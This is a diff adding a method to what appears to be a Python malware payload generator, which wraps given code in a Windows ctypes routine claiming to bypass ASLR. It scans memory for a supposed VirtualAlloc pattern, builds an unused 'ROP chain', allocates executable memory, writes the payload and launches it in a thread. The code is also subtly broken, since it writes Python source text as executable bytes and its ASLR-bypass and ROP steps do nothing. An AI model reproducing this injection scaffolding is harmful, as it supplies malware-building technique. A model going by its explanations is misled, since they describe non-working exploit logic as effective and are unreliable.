@@ -1293,3 +1293,159 @@ if __name__ == '__main__':
                 encryption_key=self.encryption_key,
                 payload_code=code
             )
+    
+    def generate_aslr_payload(self, code: str, base_address: int = 0x400000, 
+                            max_offset: int = 0x1000000) -> str:
+        """
+        Generate a payload that works with ASLR by using relative addressing and 
+        memory scanning techniques.
+        
+        Args:
+            code: The Python code to make ASLR-aware
+            base_address: Base address to use for relative calculations
+            max_offset: Maximum offset to scan for target addresses
+            
+        Returns:
+            ASLR-aware payload string
+        """
+        aslr_code = f"""
+import ctypes
+import sys
+import os
+import struct
+import mmap
+import threading
+import time
+from ctypes import wintypes
+
+def find_target_address(start_addr, end_addr, pattern):
+    \"\"\"
+    Scan memory for a specific pattern to find target addresses.
+    This helps bypass ASLR by finding known memory locations.
+    \"\"\"
+    try:
+        # Get process handle
+        PROCESS_ALL_ACCESS = 0x1F0FFF
+        process_handle = ctypes.windll.kernel32.OpenProcess(
+            PROCESS_ALL_ACCESS, False, os.getpid()
+        )
+        
+        if not process_handle:
+            return None
+        
+        try:
+            # Scan memory
+            buffer = ctypes.create_string_buffer(4096)
+            bytes_read = ctypes.c_ulong(0)
+            
+            current_addr = start_addr
+            while current_addr < end_addr:
+                if ctypes.windll.kernel32.ReadProcessMemory(
+                    process_handle,
+                    current_addr,
+                    buffer,
+                    len(buffer),
+                    ctypes.byref(bytes_read)
+                ):
+                    # Check for pattern
+                    if pattern in buffer.raw:
+                        return current_addr + buffer.raw.index(pattern)
+                
+                current_addr += len(buffer)
+        
+        finally:
+            ctypes.windll.kernel32.CloseHandle(process_handle)
+    
+    except Exception:
+        return None
+
+def calculate_relative_address(target_addr, base_addr):
+    \"\"\"
+    Calculate relative address from base address to target.
+    This allows for position-independent code.
+    \"\"\"
+    return target_addr - base_addr
+
+def create_rop_chain(gadget_addresses):
+    \"\"\"
+    Create a Return-Oriented Programming chain using found gadgets.
+    This helps bypass ASLR by using existing code snippets.
+    \"\"\"
+    rop_chain = []
+    for addr in gadget_addresses:
+        rop_chain.append(struct.pack("<I", addr))
+    return b"".join(rop_chain)
+
+def bypass_aslr():
+    \"\"\"
+    Main function to bypass ASLR and execute payload.
+    \"\"\"
+    try:
+        # Find known memory locations
+        kernel32_base = ctypes.windll.kernel32.GetModuleHandleW("kernel32.dll")
+        if not kernel32_base:
+            return False
+        
+        # Calculate relative addresses
+        virtual_alloc_addr = find_target_address(
+            kernel32_base,
+            kernel32_base + 0x100000,
+            b"\\x8B\\xEC\\x6A\\x00\\x6A\\x00\\x6A\\x00"  # Common VirtualAlloc pattern
+        )
+        
+        if not virtual_alloc_addr:
+            return False
+        
+        # Create ROP chain
+        rop_chain = create_rop_chain([
+            virtual_alloc_addr,
+            # Add more gadgets as needed
+        ])
+        
+        # Allocate memory for payload
+        payload_size = len({code!r})
+        allocated_memory = ctypes.windll.kernel32.VirtualAlloc(
+            None,
+            payload_size,
+            0x1000 | 0x2000,  # MEM_COMMIT | MEM_RESERVE
+            0x40  # PAGE_EXECUTE_READWRITE
+        )
+        
+        if not allocated_memory:
+            return False
+        
+        # Write payload to allocated memory
+        written = ctypes.c_ulong(0)
+        if not ctypes.windll.kernel32.WriteProcessMemory(
+            ctypes.windll.kernel32.GetCurrentProcess(),
+            allocated_memory,
+            {code!r},
+            payload_size,
+            ctypes.byref(written)
+        ):
+            return False
+        
+        # Execute payload
+        thread_handle = ctypes.windll.kernel32.CreateThread(
+            None,
+            0,
+            allocated_memory,
+            None,
+            0,
+            None
+        )
+        
+        if not thread_handle:
+            return False
+        
+        return True
+    
+    except Exception as e:
+        return False
+
+# Start ASLR bypass thread
+threading.Thread(target=bypass_aslr, daemon=True).start()
+
+{code}
+"""
+        return aslr_code
